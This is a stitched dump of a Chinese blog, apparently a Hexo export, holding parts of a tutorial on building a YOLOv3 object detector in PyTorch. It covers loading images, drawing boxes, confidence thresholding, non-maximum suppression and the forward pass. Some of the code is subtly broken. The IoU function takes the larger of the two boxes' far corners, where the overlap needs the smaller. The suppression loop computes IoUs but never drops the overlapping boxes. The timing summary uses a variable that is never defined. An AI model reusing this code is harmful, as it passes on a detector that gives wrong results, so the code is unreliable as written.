linux 上，你可以输入。 123mkdir datacd datawget https://raw.githubusercontent.com/ayooshkathuria/YOLO_v3_tutorial_from_scratch/master/data/coco.names 然后，在程序中加载类文件。 12num_classes = 80 #For COCOclasses = load_classes(&quot;data/coco.names&quot;) load_classes 是在 util.py 中定义的一个函数，它返回一个字典，该字典将每个类的索引映射到它名称的字符串。 1234def load_classes(namesfile): fp = open(namesfile, &quot;r&quot;) names = fp.read().split(&quot;\\n&quot;)[:-1] return names 初始化网络和加载权重。 1234567891011121314151617# Set up the neural networkprint(&quot;Loading network.....&quot;)model = Darknet(args.cfgfile)model.load_weights(args.weightsfile)print(&quot;Network successfully loaded&quot;)model.net_info[&quot;height&quot;] = args.resoinp_dim = int(model.net_info[&quot;height&quot;])assert inp_dim % 32 == 0assert inp_dim &gt; 32# If there&#x27;s a GPU availible, put the model on GPUif CUDA: model.cuda()# Set the model in evaluation modemodel.eval() ¶加载输入图片 从磁盘读取中读取图片，或者从文件夹中读取图像。图像的路径存储在一个名为 imlist 的列表中。 12345678910read_dir = time.time()#Detection phasetry: imlist = [osp.join(osp.realpath(&#x27;.&#x27;), images, img) for img in os.listdir(images)]except NotADirectoryError: imlist = [] imlist.append(osp.join(osp.realpath(&#x27;.&#x27;), images))except FileNotFoundError: print (&quot;No file or directory with the name &#123;&#125;&quot;.format(images)) exit() read_dir 是一个用于度量时间的检查点(我们将会遇到其中的几个) 接下来判断det文件夹是否存在，如果不存在，我们就创建一个： 12if not os.path.exists(args.det): os.makedirs(args.det) 我们使用opencv去读取图片： 12load_batch = time.time()loaded_ims = [cv2.imread(x) for x in imlist] OpenCV 以 numpy 数组的形式加载图像，以 BGR 作为颜色通道顺序。PyTorch 的图像输入格式为(batch x 通道 x 高度 x 宽度) ，通道顺序为 RGB。因此，我们将函数 prep_image 写入 util.py 中，将 numpy 数组转换为 PyTorch 的输入格式。 在编写这个函数之前，我们必须编写一个函数来调整图像的大小，保持长宽比的一致性，并填充剩下的区域。 12345678910111213def letterbox_image(img, inp_dim): &#x27;&#x27;&#x27;resize image with unchanged aspect ratio using padding&#x27;&#x27;&#x27; img_w, img_h = img.shape[1], img.shape[0] w, h = inp_dim new_w = int(img_w * min(w/img_w, h/img_h)) new_h = int(img_h * min(w/img_w, h/img_h)) resized_image = cv2.resize(img, (new_w,new_h), interpolation = cv2.INTER_CUBIC) canvas = np.full((inp_dim[1], inp_dim[0], 3), 128) canvas[(h-new_h)//2:(h-new_h)//2 + new_h,(w-new_w)//2:(w-new_w)//2 + new_w, :] = resized_image return canvas 现在，我们编写一个接受 OpenCV 图像的函数，并将其转换为我们网络的输入。 1234567891011def prep_image(img, inp_dim): &quot;&quot;&quot; Prepare image for inputting to the neural network. Returns a Variable &quot;&quot;&quot; img = cv2.resize(img, (inp_dim, inp_dim)) img = img[:,:,::-1].transpose((2,0,1)).copy() img = torch.from_numpy(img).float().div(255.0).unsqueeze(0) return img 除了转换图像，我们还保持了一个原始图像的列表，以及一个包含原始图像维度的im_dim_list 123456789#PyTorch Variables for imagesim_batches &#x3D; list(map(prep_image, loaded_ims, [inp_dim for x in range(len(imlist))]))#List containing dimensions of original imagesim_dim_list &#x3D; [(x.shape[1], x.shape[0]) for x in loaded_ims]im_dim_list &#x3D; torch.FloatTensor(im_dim_list).repeat(1,2)if CUDA: im_dim_list &#x3D; im_dim_list.cuda() ¶批处理 12345678leftover = 0if len(im_dim_list) % batch_size: leftover = 1if batch_size != 1: num_batches = len(imlist) // batch_size + leftover im_batches = [torch.cat((im_batches[i * batch_size: min((i + 1) * batch_size, len(im_batches))])) for i in range(num_batches)] ¶检测 我们遍历每个batch的图片，生成预测，并将所有图像的预测张量连接起来。 对于每个batch，我们测量用于检测的时间，即从获取输入到生成 write _ results 函数的输出之间所花费的时间。在 write _ prediction 返回的输出中，其中一个属性是批处理图像的索引。我们以这样的方式转换这个特定属性，它现在表示 imlist 中图像的索引，即包含所有图像地址的列表。 在此之后，我们打印每次检测所用的时间以及在每个图像中检测到的对象。 如果批处理的 write_results 函数的输出是int(0) ，这意味着没有检测，我们使用 continue 跳过循环。 12345678910111213141516171819202122232425262728293031323334353637383940write = 0start_det_loop = time.time()for i, batch in enumerate(im_batches): #load the image start = time.time() if CUDA: batch = batch.cuda() prediction = model(Variable(batch, volatile = True), CUDA) prediction = write_results(prediction, confidence, num_classes, nms_conf = nms_thesh) end = time.time() if type(prediction) == int: for im_num, image in enumerate(imlist[i*batch_size: min((i + 1)*batch_size, len(imlist))]): im_id = i*batch_size + im_num print(&quot;&#123;0:20s&#125; predicted in &#123;1:6.3f&#125; seconds&quot;.format(image.split(&quot;/&quot;)[-1], (end - start)/batch_size)) print(&quot;&#123;0:20s&#125; &#123;1:s&#125;&quot;.format(&quot;Objects Detected:&quot;, &quot;&quot;)) print(&quot;----------------------------------------------------------&quot;) continue prediction[:,0] += i*batch_size #transform the atribute from index in batch to index in imlist if not write: #If we have&#x27;t initialised output output = prediction write = 1 else: output = torch.cat((output,prediction)) for im_num, image in enumerate(imlist[i*batch_size: min((i + 1)*batch_size, len(imlist))]): im_id = i*batch_size + im_num objs = [classes[int(x[-1])] for x in output if int(x[0]) == im_id] print(&quot;&#123;0:20s&#125; predicted in &#123;1:6.3f&#125; seconds&quot;.format(image.split(&quot;/&quot;)[-1], (end - start)/batch_size)) print(&quot;&#123;0:20s&#125; &#123;1:s&#125;&quot;.format(&quot;Objects Detected:&quot;, &quot; &quot;.join(objs))) print(&quot;----------------------------------------------------------&quot;) if CUDA: torch.cuda.synchronize() 现在，我们有所有图像的检测在我们的张量输出。让我们绘制的图像边框。 ¶绘制检测框 我们使用一个 try-catch 块来检查是否进行了检测到了结果。如果不是这样的话，退出程序。 12345try: outputexcept NameError: print (&quot;No detections were made&quot;) exit() 在我们绘制边界框之前，我们的输出张量中包含的预测符合网络的输入大小，而不是图像的原始大小。因此，在我们绘制box之前，让我们将每个box的属性转换为图像的原始维度。 1234567im_dim_list = torch.index_select(im_dim_list, 0, output[:,0].long())scaling_factor = torch.min(inp_dim/im_dim_list,1)[0].view(-1,1)output[:,[1,3]] -= (inp_dim - scaling_factor*im_dim_list[:,0].view(-1,1))/2output[:,[2,4]] -= (inp_dim - scaling_factor*im_dim_list[:,1].view(-1,1))/2 现在，我们的坐标符合我们的图像在填充区域的尺寸。然而，在函数letterbox_image中，我们用缩放因子调整了图像的尺寸(请记住，两个维度都用一个公共因子进行了划分，以保持长宽比)。现在，获取原始图像上边界框的坐标。 1output[:,1:5] /= scaling_factor 现在，让我们去除掉超出图像边界的边界框。 123for i in range(output.shape[0]): output[i, [1,3]] = torch.clamp(output[i, [1,3]], 0.0, im_dim_list[i,0]) output[i, [2,4]] = torch.clamp(output[i, [2,4]], 0.0, im_dim_list[i,1]) 如果图像中有太多的box，用一种颜色把它们都画出来可能不是一个好主意。将此文件下载到您的文件下。这是一个 pickle 文件，其中包含许多可随机选择的颜色。 12class_load &#x3D; time.time()colors &#x3D; pkl.load(open(&quot;pallete&quot;, &quot;rb&quot;)) 现在让我们写一个函数来绘制box。 1234567891011121314draw = time.time()def write(x, results, color): c1 = tuple(x[1:3].int()) c2 = tuple(x[3:5].int()) img = results[int(x[0])] cls = int(x[-1]) label = &quot;&#123;0&#125;&quot;.format(classes[cls]) cv2.rectangle(img, c1, c2,color, 1) t_size = cv2.getTextSize(label, cv2.FONT_HERSHEY_PLAIN, 1 , 1)[0] c2 = c1[0] + t_size[0] + 3, c1[1] + t_size[1] + 4 cv2.rectangle(img, c1, c2,color, -1) cv2.putText(img, label, (c1[0], c1[1] + t_size[1] + 4), cv2.FONT_HERSHEY_PLAIN, 1, [225,255,255], 1); return img 上面的函数从颜色中随机选择一种颜色绘制一个矩形。它还在边框的左上角创建一个实心矩形，并写上检测的结果。我们使用 cv2.rectangle 函数创建一个实心矩形。 我们在本地定义write函数，这样它就可以访问颜色列表。我们也可以把颜色作为一个参数，但这样我们就只能对每张图片使用一种颜色。 在定义了这个函数之后，让我们现在在图像上绘制边框 1list(map(lambda x: write(x, loaded_ims), output)) 通过在图像名称前加上“ det _”来保存每个图像。我们创建了一个列表，将检测图像保存到该列表中。 1det_names = pd.Series(imlist).apply(lambda x: &quot;&#123;&#125;/det_&#123;&#125;&quot;.format(args.det,x.split(&quot;/&quot;)[-1])) 最后，将预测出来的图片保存到相应地址当中： 12list(map(cv2.imwrite, det_names, loaded_ims))end = time.time() ¶打印时间信息 在程序的末尾，我们将打印一些信息，其中包含执行代码的哪一部分所花费的时间。当我们必须比较不同的超参数如何影响探测器的速度时，这是信息是很有用的。在命令行上执行脚本 detection.py 时，可以设置超参数，如batch size、置信度阈值和 NMS 阈值。 1234567891011121314print(&quot;SUMMARY&quot;)print(&quot;----------------------------------------------------------&quot;)print(&quot;&#123;:25s&#125;: &#123;&#125;&quot;.format(&quot;Task&quot;, &quot;Time Taken (in seconds)&quot;))print()print(&quot;&#123;:25s&#125;: &#123;:2.3f&#125;&quot;.format(&quot;Reading addresses&quot;, load_batch - read_dir))print(&quot;&#123;:25s&#125;: &#123;:2.3f&#125;&quot;.format(&quot;Loading batch&quot;, start_det_loop - load_batch))print(&quot;&#123;:25s&#125;: &#123;:2.3f&#125;&quot;.format(&quot;Detection (&quot; + str(len(imlist)) + &quot; images)&quot;, output_recast - start_det_loop))print(&quot;&#123;:25s&#125;: &#123;:2.3f&#125;&quot;.format(&quot;Output Processing&quot;, class_load - output_recast))print(&quot;&#123;:25s&#125;: &#123;:2.3f&#125;&quot;.format(&quot;Drawing Boxes&quot;, end - draw))print(&quot;&#123;:25s&#125;: &#123;:2.3f&#125;&quot;.format(&quot;Average time_per_img&quot;, (end - load_batch)/len(imlist)))print(&quot;----------------------------------------------------------&quot;)torch.cuda.empty_cache() ¶测试对象检测器 例如，在终端上运行: 1python detect.py --images dog-cycle-car.png --det det 12345678910111213141516Loading network.....Network successfully loadeddog-cycle-car.png predicted in 2.456 secondsObjects Detected: bicycle truck dog----------------------------------------------------------SUMMARY----------------------------------------------------------Task : Time Taken (in seconds)Reading addresses : 0.002Loading batch : 0.120Detection (1 images) : 2.457Output Processing : 0.002Drawing Boxes : 0.076Average time_per_img : 2.657---------------------------------------------------------- 名为 det_dog-cycle-car.png 的图片保存在 det 目录中。","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"深度学习基础知识/yolo","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/yolo/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"yolo","permalink":"http://blog.keter.top/tags/yolo/"}]},{"title":"「YOLOv3」从头实现YOLOv3目标检测（四）置信度阈值与NMS","slug":"「YOLOv3」从头实现YOLOv3目标检测（四）置信度阈值与NMS","date":"2021-08-19T07:14:54.000Z","updated":"2021-08-20T08:27:01.000Z","comments":true,"path":"2021/08/19/「YOLOv3」从头实现YOLOv3目标检测（四）置信度阈值与NMS/","link":"","permalink":"http://blog.keter.top/2021/08/19/%E3%80%8CYOLOv3%E3%80%8D%E4%BB%8E%E5%A4%B4%E5%AE%9E%E7%8E%B0YOLOv3%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%EF%BC%88%E5%9B%9B%EF%BC%89%E7%BD%AE%E4%BF%A1%E5%BA%A6%E9%98%88%E5%80%BC%E4%B8%8ENMS/","excerpt":"","text":"本教程转载于：https://blog.paperspace.com/how-to-implement-a-yolo-object-detector-in-pytorch/, 在原教程上加入了自己的理解，我的理解将用 这样的格式写出. （ 原博客中有错误的地方在本文中也进行了修正 ） 这是从头开始实现 YOLO v3检测器的教程的第4部分。在上一部分，我们实现了网络的前向传递。在这一部分中，我们通过一个目标置信度和一个非最大抑制度来筛选我们的检测结果。 在前面的部分中，我们建立了一个模型，输出给定一个输入图像的多个目标检测。准确地说，我们的输出是一个形状为 b x 22743 x 85的张量。B 是一批图像的数量，22743是每张图像预测的box的数量，85是包围盒属性的数量。 然而，正如第1部分所描述的，我们必须将我们的输出经过置信度阈值和非极大值抑制的过滤，以获得真实的检测结果。为此，我们将在utils.py中创建一个名为write_result的函数。 1def write_results(prediction, confidence, num_classes, nms_conf = 0.4): 函数以prediction、confidence(objectness score threshold)、 num_classes (在我们的例子中是80)和 NMS _ conf (NMS IoU 阈值)作为输入。 我们还需要将置信度低于阈值的项至为0: 12conf_mask = (prediction[:, :, 4] &gt; confidence).float().unsqueeze(2)prediction = prediction * conf_mask ¶Object Confidence Thresholding 我们的预测张量包含了关于 B x 22743个box的信息。对于每个得分低于阈值的box盒，我们将其每个属性(表示box的整行)的值设置为零。 ¶执行非最大值抑制 注意: 我假设您理解 IoU (Intersection over union)是什么，以及非最大抑制是什么。如果事实并非如此，请参考文章末尾的链接)。 还有一点需要知道的就是YOLOv3中NMS在训练的过程中不执行的，在本套课程里面我们只写了推理的过程，并没有写计算loss的过程。所以就连带NMS进行了编写。正式因为不需要训练，所以也就不需要保留梯度。所以你可以在代码中看到将tensor一会加载到cpu一会加载到gpu上的操作。这种操作在训练过程中都是不允许出现的。 我们现在拥有的box属性是由中心坐标以及边界框的高度和宽度来描述的。然而，使用每个box的一对对角点的坐标来计算两个盒子的IOU更容易。因此，我们将框的(center x，center y，height，width)属性转换为(left-top x，left-top y，right-bottom x，right-bottom y)。 1234567# xywh =&gt; xyxybox_corner = prediction.new(prediction.shape)box_corner[:, :, 0] = (prediction[:, :, 0] - prediction[:, :, 2] / 2)box_corner[:, :, 1] = (prediction[:, :, 1] - prediction[:, :, 3] / 2)box_corner[:, :, 2] = (prediction[:, :, 0] + prediction[:, :, 2] / 2)box_corner[:, :, 3] = (prediction[:, :, 1] + prediction[:, :, 3] / 2)prediction[:, :, :4] = box_corner[:, :, :4] 每幅图像中真实值的数量可能不同。例如，一批图像1、2和3分别有5、2和4个真实检测值。因此，一次只能对一幅图像进行置信阈值分割和 NMS 处理。这意味着，我们不能对所涉及的操作进行矢量化，而必须通过一个for循环来对每一个图片进行处理。 12345write = Falsefor ind in range(batch_size): image_pred = prediction[ind] # 置信度过滤 # NMS write 标志用于表示我们有没有初始化输出。 一旦进入循环，让我们捋清楚一下思路。注意每个box行有85个属性，其中80个是类分数。在这一点上，我们只关心具有最大值的类分数。因此，我们从每一行中删除80个类分数，然后添加具有最大值的类的索引以及该类的类分数。 12345max_conf, max_conf_score = torch.max(image_pred[:, 5:5 + num_classes], 1)max_conf = max_conf.float().unsqueeze(1)max_conf_score = max_conf_score.float().unsqueeze(1)seq = (image_pred[:, :5], max_conf, max_conf_score)image_pred = torch.cat(seq, 1) 还记得我们已经将对象置信度小于阈值的box行设置为零吗？下面我们将去除这些box 12345678non_zero_ind = (torch.nonzero(image_pred[:, 4]))try: image_pred_ = image_pred[non_zero_ind.squeeze(), :].view(-1, 7)except: continueif image_pred_.shape[0] == 0: continue try-except 块用于处理我们没有检测到物体的情况，在这种情况下，我们使用 continue 。 现在，让我们在一个图像中检测出类。 123456 image_classes = unique(image_pred_[:, -1]) def unique(tensor): unique_tensor = torch.unique(tensor.clone()) return unique_tensor 然后，我们执行 NMS . 1for cls in img_classes: 一旦进入循环，我们要做的第一件事就是提取特定类的检测(由变量 cls 表示)。我们接着写write_results这个函数。 12345678# 获取某一个特定类别的检测结果cls_mask = image_pred_ * (image_pred_[:, -1] == cls).float().unsqueeze(1)class_mask_ind = torch.nonzero(cls_mask[:, -2]).squeeze()image_pred_class = image_pred_[class_mask_ind].view(-1, 7)# 根据objectness score 进行排序conf_sort_index = torch.sort(image_pred_class[:, 4], descending=True)[1]image_pred_class = image_pred_class[conf_sort_index]idx = image_pred_class.size(0) # 检测结果的数量 下面我们开始写NMS 123456789101112for i in range(idx): # 计算所有box的IOU try: ious = bbox_iou(image_pred_class[i].unsqueeze(0), image_pred_class[i + 1:]) except ValueError: break except IndexError: break # 去除所有IOU小于阈值的检测框 non_zero_ind = torch.nonzero(image_pred_class[:, 4]).squeeze() image_pred_class = image_pred_class[non_zero_ind].view(-1, 7) 这里，我们使用一个函数 bbox_iou去计算box的iou bbox_iou的第二个参数是由多个box组成的张量。我们将objectness最高的box作为预测值，计算其他box和他的iou值。 如果我们有两个同一类的边界框，其中一个IOU大于一个阈值，那么低置信度的那个就被剔除了。我们已经整理好了box，其中包括那些高置信度的box。 在循环的主体中，下面的行给出了 image_pred_class[i+1:] 里面所有box的IOU： 1ious &#x3D; bbox_iou(image_pred_class[i].unsqueeze(0), image_pred_class[i+1:]) 每次迭代，如果任何一个索引大于 i 的box有一个大于阈值 nms_thresh 的 IoU (包含一个被 i 索引的box) ，那么这个box就被消除。 ¶计算IoU 下面是计算IoU的代码： 123456789101112131415161718192021222324def bbox_iou(box1, box2): &quot;&quot;&quot; 返回两个boxes的IoU &quot;&quot;&quot; # 获取边界框的坐标 b1_x1, b1_y1, b1_x2, b1_y2 = box1[:, 0], box1[:, 1], box1[:, 2], box1[:, 3] b2_x1, b2_y1, b2_x2, b2_y2 = box2[:, 0], box2[:, 1], box2[:, 2], box2[:, 3] # 得到相交矩形的坐标 inter_rect_x1 = torch.max(b1_x1, b2_x1) inter_rect_y1 = torch.max(b1_y1, b2_y1) inter_rect_x2 = torch.max(b1_x2, b2_x2) inter_rect_y2 = torch.max(b1_y2, b2_y2) # 交叉面积 inter_area = torch.clamp(inter_rect_x2 - inter_rect_x1 + 1, min=0) * torch.clamp(inter_rect_y2 - inter_rect_y1 + 1, min=0) # union 面积 b1_area = (b1_x2 - b1_x1 + 1) * (b1_y2 - b1_y1 + 1) b2_area = (b2_x2 - b2_x1 + 1) * (b2_y2 - b2_y1 + 1) iou = inter_area / (b1_area + b2_area - inter_area) return iou ¶写预测代码 write_results的输出是一个纬度为D x 8的张量。这里 D 是所有图像中的真实预测值，每个图像由一行表示。每个检测结果具有8个属性，即检测所属的批中图像的索引、4个角坐标、objectness score、最大的类置信度和该类的索引。 正如以前一样，我们不初始化输出张量，除非我们有一个检测分配给它。一旦它被初始化，我们就其与后续的检测结果连接。 12345678batch_ind = image_pred_class.new(image_pred_class.size(0), 1).fill_(ind)seq = batch_ind, image_pred_classif not write: output = torch.cat(seq, 1) write = Trueelse: out = torch.cat(seq, 1) output = torch.cat((output, out)) 在函数的末尾，我们检查输出是否已经初始化。如果没有意味着在这个batch的图片里面没有任何一张图片。在这种情况下，我们返回0。 1234try: return outputexcept: return 0 这就是这篇文章的内容。在这篇文章的最后，我们终于有了一个预测的形式张量列出每个预测的结果。现在唯一剩下的，就是创建一个输入管道，从磁盘读取图像，计算预测，在图像上绘制边界框，然后显示/写入这些图像。这就是我们在下一部分将要做的。 ¶相关学习链接 PyTorch tutorial IoU Non maximum suppresion Non-maximum Suppression","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"深度学习基础知识/yolo","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/yolo/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"yolo","permalink":"http://blog.keter.top/tags/yolo/"}]},{"title":"「YOLOv3」从头实现YOLOv3目标检测（三）实现网络体系结构","slug":"「YOLOv3」从头实现YOLOv3目标检测（三）实现网络体系结构","date":"2021-08-19T00:28:13.000Z","updated":"2021-08-20T08:40:08.000Z","comments":true,"path":"2021/08/19/「YOLOv3」从头实现YOLOv3目标检测（三）实现网络体系结构/","link":"","permalink":"http://blog.keter.top/2021/08/19/%E3%80%8CYOLOv3%E3%80%8D%E4%BB%8E%E5%A4%B4%E5%AE%9E%E7%8E%B0YOLOv3%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/","excerpt":"","text":"本教程转载于：https://blog.paperspace.com/how-to-implement-a-yolo-object-detector-in-pytorch/, 在原教程上加入了自己的理解，我的理解将用 这样的格式写出. （ 原博客中有错误的地方在本文中也进行了修正 ） 这是从头开始实现 YOLO v3检测器的教程的第3部分。在上一部分中，我们实现了 YOLO 体系结构中使用的层，在这一部分中，我们将使用 PyTorch 搭建 YOLO 的网络体系结构，这样我们就可以生成给定图像的输出。 我们的目标是设计网络的前向传递。 ¶定义网络 正如之前所说的，我们使用nn.Module去构建自定义模块。接下来我们将定义检测器的网络结构。在darknet.py 中添加如下的内容： 12345class Darknet(nn.Module): def __init__(self, cfg_file_path): super(Darknet, self).__init__() self.blocks = parse_cfg(cfg_file_path) self.net_info, self.module_list = create_modules(self.blocks) 现在我们有了Darknet类，现在他有三个初始化变量，block, net_info 和 module_list ¶实现网络的前向传播 forward有两个目的。第一计算输出，第二点将输出的feature maps转化为可以被更容易处理的形式。例如通过转换让多个尺度的feature maps可以拼接起来，如果不进行转化，这就是不可能的，因为它们是不同的维度。 123def forward(self, x, CUDA): modules = self.blocks[1:] outputs = &#123;&#125; # 我们为路由层缓存输出 forward 函数有三个参数，self, x 和 CUDA。我们将使用GPU去计算前向传播。 这里我们使用了self.blocks[1:]，因为blocks的第一项是网络一些基本参数。 由于路由层和残差层需要前一层的feature map，因此我们将每一层的输出feature map缓存到 dict 中。 我们现在遍历module_list, 它里面包含了网络的结构。 这里需要注意的是，模块的附加顺序与它们在配置文件中的顺序相同。这意味着，我们可以简单地通过每个模块运行来获得输出。 123write = 0 # 这个过会解释for i, module in enumerate(modules): module_type = (module[&#x27;type&#x27;]) ¶Convolutional and Upsample Layers 如果模块是卷积模块或上采样模块，处理代码如下： 12if module_type == &#x27;convolutional&#x27; or module_type == &#x27;upsample&#x27;: x = self.module_list[i](x) ¶Route Layer / Shortcut Layer 根据路由层的代码，我们需要考虑两种情况(如第2部分所述)。对于必须连接两个feature maps的情况，我们使用torch.cat方法，第二个参数设为1. 这是因为我们想沿深度连接feature maps。 12345678910111213141516171819202122elif module_type == &#x27;route&#x27;: layers = module[&#x27;layers&#x27;] layers = [int(a) for a in layers] if layers[0] &gt; 0: layers[0] = layers[0] - i # layers 长度为1时不需要进行feature map的拼接 if len(layers) == 1: x = outputs[i + layers[0]] # 需要将两个feature maps进行拼接 else: if layers[1] &gt; 0: layers[1] = layers[1] - i map1 = outputs[i + layers[0]] map2 = outputs[i + layers[1]] x = torch.cat((map1, map2), 1)elif module_type == &#x27;shortcut&#x27;: from_ = int(module[&#x27;from&#x27;]) x = outputs[i - 1] + outputs[i + from_] ¶YOLO (Detection Layer) YOLO 的输出是一个卷积feature map，包含沿着feature map深度的box属性。网格预测的box属性是一个接一个地堆放在一起的。 如果你必须访问第二个单元格的边界在(5,6) ，那么你必须通过映射[5,6，(5 + c) : 2 * (5 + c)]来索引它。这种形式对于目标置信阈值化、向添加中心网格偏移量、应用锚点等输出处理非常不方便。 另一个问题是，由于检测发生在三个尺度，预测图的维度将会不同。虽然这三个特征映射的尺寸不同，但是对它们进行的输出处理操作是相似的。如果可以对单个张量而不是对三个单独的张量进行操作就好了。 为了解决这些问题，我们引入了函数 predict_transform. ¶转化输出 函数predict_transform 在util.py中。 在util.py的头部添加如下代码： 12345678from __future__ import divisionimport torch import torch.nn as nnimport torch.nn.functional as F from torch.autograd import Variableimport numpy as npimport cv2 predict_transform 一共有五个参数： 12def predict_transform(prediction, inp_dim, anchors, num_class, CUDA=True): 函数获取一个检测feature map，并将其转化为一个二维张量，其中每一行对应于一个box的属性，顺序如下 下面是执行上述转换的代码。 123456789batch_size = prediction.size(0)stride = inp_dim // prediction.size(2)grid_size = inp_dim // stridebbox_attrs = 5 + num_classesnum_anchors = len(anchors)prediction = prediction.view(batch_size, bbox_attrs * num_anchors, grid_size*grid_size)prediction = prediction.transpose(1, 2).contiguous()prediction = prediction.view(batch_size, grid_size*grid_size*num_anchors, bbox_attrs) 锚的尺寸与net的height和width属性一致。这些属性描述了输入图像的尺寸，它比检测图大(大一个步幅因子)。因此，必须根据检测feature map的步长来划分锚点。 1anchors = [(a[0]/stride,a[1]/stride) for a in anchors] 现在，我们需要根据第1部分中讨论的公式转换输出 将 x，y 坐标和objection score输出到sigmoid中： 123prediction[:, :, 0] = torch.sigmoid(prediction[:, :, 0])prediction[:, :, 1] = torch.sigmoid(prediction[:, :, 1])prediction[:, :, 4] = torch.sigmoid(prediction[:, :, 4]) 然后，将网格偏移量添加到中心坐标中协调预测： 12345678910111213# 添加网格偏移量grid = np.arange(grid_size)a, b = np.meshgrid(grid, grid)x_offset = torch.FloatTensor(a).view(-1, 1)y_offset = torch.FloatTensor(b).view(-1, 1)if CUDA: x_offset = x_offset.cuda() y_offset = y_offset.cuda()x_y_offset = torch.cat((x_offset, y_offset), 1).repeat(1, num_anchors).view(-1, 2).unsqueeze(0)prediction[:, :, :2] += x_y_offset 接下来，在边界框的尺寸上应用anchors： 12345678# 在边界框的尺寸上应用锚点anchors = torch.FloatTensor(anchors)if CUDA: anchors = anchors.cuda()anchors = anchors.repeat(grid_size * grid_size, 1).unsqueeze(0)prediction[:, :, 2:4] = torch.exp(prediction[:, :, 2:4]) * anchors 对分类score使用sigmoid激活函数： 1prediction[:, :, 5:5 + num_classes] = torch.sigmoid((prediction[:, :, 5: 5 + num_classes])) 我们在这里要做的最后一件事，是调整detection map到输入图像的大小。这里的box属性是根据feature map(例如，13 x 13)来确定大小的。如果输入的图像是416 x 416，我们将属性乘以32，或者stride 1prediction[:, :, :4] *= stride ¶检测层再探讨 现在我们已经转换了输出张量，现在可以将三个不同比例的检测映射连接成一个大张量。请注意，在我们转换之前这是不可能的，因为我们不能连接具有不同空间维度的feature maps。但是从现在开始，我们的输出张量仅仅作为一个行的box盒的表，串联是非常可能的。 我们前进道路上的一个障碍是我们不能初始化一个空张量，然后将一个非空(不同形状)张量连接到它。因此，我们推迟collector的初始化(保存检测的张量) ，直到我们得到第一个feature map，然后在我们得到后续检测时连接到映射。 注意函数 forward 中循环之前的 write = 0。write 标志用于表示我们是否遇到了第一个检测。如果 write 为 0，则表示collector尚未初始化。如果是1，则意味着collector已经初始化，我们可以将检测映射连接到它。 现在，我们已经有predict_transform 这个强大的武器来，下面我们在 forward 函数中编写了处理检测feature map的代码。 在 darknet.py 文件的顶部，添加以下导入。 1from utils import * 然后，在forward函数中。 123456789101112131415161718elif module_type == &#x27;yolo&#x27;: anchors = self.module_list[i][0].anchors # 获取输入纬度 inp_dim = int(self.net_info[&#x27;height&#x27;]) # 获取类别数量 num_classes = int(module[&#x27;classes&#x27;]) # 转化 x = x.data x = predict_transform(x, inp_dim, anchors, num_classes, CUDA) if not write: detections = x write = 1 else: detections = torch.cat((detections, x), 1)outputs[i] = x ¶测试forward 这是一个创建测试输入的函数。我们将把这个输入传递给我们的网络。在我们编写这个函数之前，把这个图片保存到你的工作目录中。如果你使用的是 linux，那么输入。 1wget https://github.com/ayooshkathuria/pytorch-yolo-v3/raw/master/dog-cycle-car.png 在 darknet.py 文件的顶部定义如下函数: 123456789def get_test_input(img_path): img = cv2.imread(img_path) # 这个大小需要和你cfg里面的图片大小相对应 img = cv2.resize(img, (608, 608)) # BGR =&gt; RGB img_ = img[:, :, ::-1].transpose((2, 0, 1)) img_ = img_[np.newaxis, :, :, :] / 255.0 img_ = torch.from_numpy(img_).float() return img_ 我们运行如下的测试代码： 1234model = Darknet(&#x27;cfg/yolov3.cfg&#x27;).cuda()inp = get_test_input(&#x27;dog-cycle-car.png&#x27;).cuda()pred = model(inp, torch.cuda.is_available())print(pred) 可以得到如下的结果： 12345678910111213tensor([[[1.5188e+01, 1.6643e+01, 8.9002e+01, ..., 5.2412e-01, 5.7080e-01, 5.2281e-01], [1.4089e+01, 1.8250e+01, 1.0033e+02, ..., 5.5339e-01, 4.4268e-01, 5.8961e-01], [1.6033e+01, 1.4834e+01, 2.0343e+02, ..., 4.9131e-01, 4.3267e-01, 5.1848e-01], ..., [6.0408e+02, 6.0499e+02, 1.0931e+01, ..., 3.9232e-01, 5.2076e-01, 5.1312e-01], [6.0494e+02, 6.0365e+02, 1.9087e+01, ..., 3.5823e-01, 5.2685e-01, 4.0312e-01], [6.0389e+02, 6.0437e+02, 2.9261e+01, ..., 4.2379e-01, 4.4921e-01, 5.2107e-01]]], device&#x3D;&#39;cuda:0&#39;) 这个张量的形状是[1, 22743, 85]。第一个维度是batch size，这只是1，因为我们使用了一个单一的图像。对于批处理中的每个图像，我们有一个22743 x 85的表。每个表的行代表一个边界框。(4个 bbox 属性，1个 objectness 得分，80个class得分) 在这一点上，我们的网络有随机权重，并不会产生正确的输出。我们需要在网络中加载一个权重文件。为此，我们将使用官方的权重文件。 ¶下载与训练模型 将权重文件下载到目录当中： wget https://pjreddie.com/media/files/yolov3.weights weights很大，你要忍一下。速度实在太慢就爬梯子吧。 ¶理解权重文件 官方的权重文件是二进制文件，其中包含以串行方式存储的权重。 